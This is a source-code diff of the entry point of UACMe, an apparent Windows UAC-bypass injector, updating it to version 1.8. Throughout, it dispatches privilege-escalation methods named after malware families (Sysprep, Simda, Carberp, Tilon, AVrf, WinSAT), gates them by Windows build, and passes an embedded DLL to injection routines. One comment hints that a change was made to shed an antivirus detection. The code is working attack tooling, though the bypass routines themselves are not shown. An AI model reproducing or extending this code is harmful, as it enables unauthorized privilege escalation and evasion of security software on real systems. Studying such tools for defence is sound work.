@@ -4,9 +4,9 @@
 *
 *  TITLE:       MAIN.C
 *
-*  VERSION:     1.72
+*  VERSION:     1.8
 *
-*  DATE:        28 Apr 2015
+*  DATE:        11 July 2015
 *
 *  Injector entry point.
 *
@@ -18,6 +18,7 @@
 *******************************************************************************/
 
 #include "global.h"
+#include <VersionHelpers.h>
 
 #ifdef _WIN64
 #include "hibiki64.h"
@@ -34,10 +35,31 @@
 #define PROGRAMTITLE TEXT("UACMe")
 #define WOW64STRING TEXT("Apparently it seems you are running under WOW64.\n\r\
 This is not supported, run x64 version of this tool.")
+#define WINPRE10 TEXT("This method is only for Windows 7/8/8.1")
 #define WINPREBLUE TEXT("This method is only for pre Windows 8.1 use")
 #define WINBLUEONLY TEXT("This method is only for Windows 8.1 use")
 #define WIN10ONLY TEXT("This method is only for Windows 10 use")
 #define WOW64WIN32ONLY TEXT("This method only works from x86-32 Windows or Wow64")
+#define LAZYWOW64UNSUPPORTED TEXT("Use 32 bit version of this tool on 32 bit OS version")
+#define UAC10FIX TEXT("This method does not work in Windows 10 builds greater than 10136")
+
+/*
+* ucmShowMessage
+*
+* Purpose:
+*
+* Output message to user.
+*
+*/
+VOID ucmShowMessage(
+	LPTSTR lpszMsg
+	)
+{
+	if (lpszMsg) {
+		MessageBox(GetDesktopWindow(), 
+			lpszMsg, PROGRAMTITLE, MB_ICONINFORMATION);
+	}
+}
 
 /*
 * main
@@ -56,26 +78,26 @@ VOID main()
 	TOKEN_ELEVATION_TYPE	ElevType;
 	RTL_OSVERSIONINFOW		osver;
 
-	//verify system version
-	RtlSecureZeroMemory(&osver, sizeof(osver));
-	osver.dwOSVersionInfoSize = sizeof(osver);
-	RtlGetVersion(&osver);
-
-	if (osver.dwBuildNumber < 7000) {
-
-		MessageBox(GetDesktopWindow(),
-			TEXT("Unsupported version"), PROGRAMTITLE, MB_ICONINFORMATION);
-
+	//query windows version
+	if (!supIsWindowsVersionOrGreater(HIBYTE(_WIN32_WINNT_WIN7), LOBYTE(_WIN32_WINNT_WIN7), 0)) {
+		//also remove Trojan:Win64/Bampeass.A
+		ucmShowMessage(TEXT("This Windows is unsupported."));
 		goto Done;
 	}
+
+	//query build number
+	RtlSecureZeroMemory(&osver, sizeof(osver));
+	osver.dwOSVersionInfoSize = sizeof(osver);
+	if (!NT_SUCCESS(RtlGetVersion(&osver))) {
+		goto Done;
+	} 
 
 	ElevType = TokenElevationTypeDefault;
 	if (!supGetElevationType(&ElevType)) {
 		goto Done;
 	}
 	if (ElevType != TokenElevationTypeLimited) {
-		MessageBox(GetDesktopWindow(), TEXT("Admin account with limited token required."), 
-			PROGRAMTITLE, MB_ICONINFORMATION);
+		ucmShowMessage(TEXT("Admin account with limited token required."));
 		goto Done;
 	}
 
@@ -92,8 +114,7 @@ VOID main()
 		case METHOD_SYSPREP1:
 			OutputDebugString(TEXT("[UCM] Sysprep cryptbase\n\r"));
 			if (osver.dwBuildNumber > 9200) {
-				MessageBox(GetDesktopWindow(), WINPREBLUE,
-					PROGRAMTITLE, MB_ICONINFORMATION);
+				ucmShowMessage(WINPREBLUE);
 				goto Done;
 			}
 			break;
@@ -101,17 +122,15 @@ VOID main()
 		case METHOD_SYSPREP2:
 			OutputDebugString(TEXT("[UCM] Sysprep shcore\n\r"));
 			if (osver.dwBuildNumber < 9600) {
-				MessageBox(GetDesktopWindow(), WINBLUEONLY,
-					PROGRAMTITLE, MB_ICONINFORMATION);
+				ucmShowMessage(WINBLUEONLY);
 				goto Done;
 			}
 			break;
 
 		case METHOD_SYSPREP3:
-			OutputDebugString(TEXT("[UCM] Sysprep iertutil\n\r"));
+			OutputDebugString(TEXT("[UCM] Sysprep dbgcore\n\r"));
 			if (osver.dwBuildNumber < 10000) {
-				MessageBox(GetDesktopWindow(), WIN10ONLY,
-					PROGRAMTITLE, MB_ICONINFORMATION);
+				ucmShowMessage(WIN10ONLY);
 				goto Done;
 			}
 			break;
@@ -124,13 +143,16 @@ VOID main()
 			OutputDebugString(TEXT("[UCM] AppCompat RedirectEXE\n\r"));
 
 #ifdef _WIN64
-			MessageBox(GetDesktopWindow(), WOW64WIN32ONLY,
-				PROGRAMTITLE, MB_ICONINFORMATION);
+			ucmShowMessage(WOW64WIN32ONLY);
 			goto Done;
 #endif
 			break;
 
 		case METHOD_SIMDA:
+			if (osver.dwBuildNumber > 10136) {
+				ucmShowMessage(UAC10FIX);
+				goto Done;
+			}
 			OutputDebugString(TEXT("[UCM] Simda\n\r"));
 			break;
 
@@ -145,13 +167,16 @@ VOID main()
 		case METHOD_TILON:
 			OutputDebugString(TEXT("[UCM] Tilon\n\r"));
 			if (osver.dwBuildNumber > 9200) {
-				MessageBox(GetDesktopWindow(), WINPREBLUE,
-					PROGRAMTITLE, MB_ICONINFORMATION);
+				ucmShowMessage(WINPREBLUE);
 				goto Done;
 			}
 			break;
 
 		case METHOD_AVRF:
+			if (osver.dwBuildNumber > 10136) {
+				ucmShowMessage(UAC10FIX);
+				goto Done;
+			}
 			OutputDebugString(TEXT("[UCM] AVrf\n\r"));
 			break;
 
@@ -163,15 +188,13 @@ VOID main()
 			OutputDebugString(TEXT("[UCM] AppCompat Shim Patch\n\r"));
 
 #ifdef _WIN64
-			MessageBox(GetDesktopWindow(), WOW64WIN32ONLY,
-				PROGRAMTITLE, MB_ICONINFORMATION);
+			ucmShowMessage(WOW64WIN32ONLY);
 			goto Done;
 #endif		
 			break;
-
+			
 		}
 	}
-
 
 	switch (dwType) {
 
@@ -182,12 +205,11 @@ VOID main()
 	case METHOD_TILON:
 
 		//
-		// Since we are using injection and not using heavens gate, we should ban usage under wow64.
+		// Since we are using injection and not using heavens gate/syswow64, we should ban usage under wow64.
 		//
 #ifndef _DEBUG
 		if (IsWow64) {
-			MessageBox(GetDesktopWindow(),
-				WOW64STRING, PROGRAMTITLE, MB_ICONINFORMATION);
+			ucmShowMessage(WOW64STRING);
 			goto Done;
 		}
 #endif
@@ -214,8 +236,7 @@ VOID main()
 		//
 #ifndef _DEBUG
 		if (IsWow64) {
-			MessageBox(GetDesktopWindow(),
-				WOW64STRING, PROGRAMTITLE, MB_ICONINFORMATION);
+			ucmShowMessage(WOW64STRING);
 			goto Done;
 		}
 #endif
@@ -235,15 +256,13 @@ VOID main()
 		if (dwType == METHOD_CARBERP) {
 
 			if (osver.dwBuildNumber > 9600) {
-				MessageBox(GetDesktopWindow(),
-					TEXT("This method is only for Windows 7/8/8.1"), PROGRAMTITLE, MB_ICONINFORMATION);
+				ucmShowMessage(WINPRE10);
 				goto Done;
 			}
 
 			//there is no migmiz in syswow64 in 8+
 			if ((IsWow64) && (osver.dwBuildNumber > 7601)) {
-				MessageBox(GetDesktopWindow(),
-					WOW64STRING, PROGRAMTITLE, MB_ICONINFORMATION);
+				ucmShowMessage(WOW64STRING);
 				goto Done;
 			}
 		}
@@ -251,13 +270,11 @@ VOID main()
 		if (dwType == METHOD_CARBERP_EX) {
 #ifndef _DEBUG
 			if (IsWow64) {
-				MessageBox(GetDesktopWindow(),
-					WOW64STRING, PROGRAMTITLE, MB_ICONINFORMATION);
+				ucmShowMessage(WOW64STRING);
 				goto Done;
 			}
 #endif
 		}
-
 
 		if (ucmWusaMethod(dwType, (CONST PVOID)INJECTDLL, sizeof(INJECTDLL))) {
 			OutputDebugString(TEXT("[UCM] Carberp method called\n\r"));
@@ -267,8 +284,7 @@ VOID main()
 	case METHOD_AVRF:
 #ifndef _DEBUG
 		if (IsWow64) {
-			MessageBox(GetDesktopWindow(),
-				WOW64STRING, PROGRAMTITLE, MB_ICONINFORMATION);
+			ucmShowMessage(WOW64STRING);
 			goto Done;
 		}
 #endif
@@ -282,8 +298,7 @@ VOID main()
 		// Decoding WOW64 environment, turning wow64fs redirection is meeh. Just drop it as it just a test tool.
 		//
 		if (IsWow64) {
-			MessageBox(GetDesktopWindow(),
-				TEXT("Use 32 bit version of this tool on 32 bit OS version"), PROGRAMTITLE, MB_ICONINFORMATION);
+			ucmShowMessage(LAZYWOW64UNSUPPORTED);
 			goto Done;
 		}
 
@@ -294,12 +309,12 @@ VOID main()
 			p = L"devobj.dll";
 		}
 
-		if (ucmWinSATMethod(p, (CONST PVOID)INJECTDLL, sizeof(INJECTDLL))) {
+		if (ucmWinSATMethod(p, (CONST PVOID)INJECTDLL, sizeof(INJECTDLL), (osver.dwBuildNumber <= 10136))) {
 			OutputDebugString(TEXT("[UCM] WinSAT method called\n\r"));
 		}
 		break;
 	}
-
+	
 Done:
 	ExitProcess(0);
 }
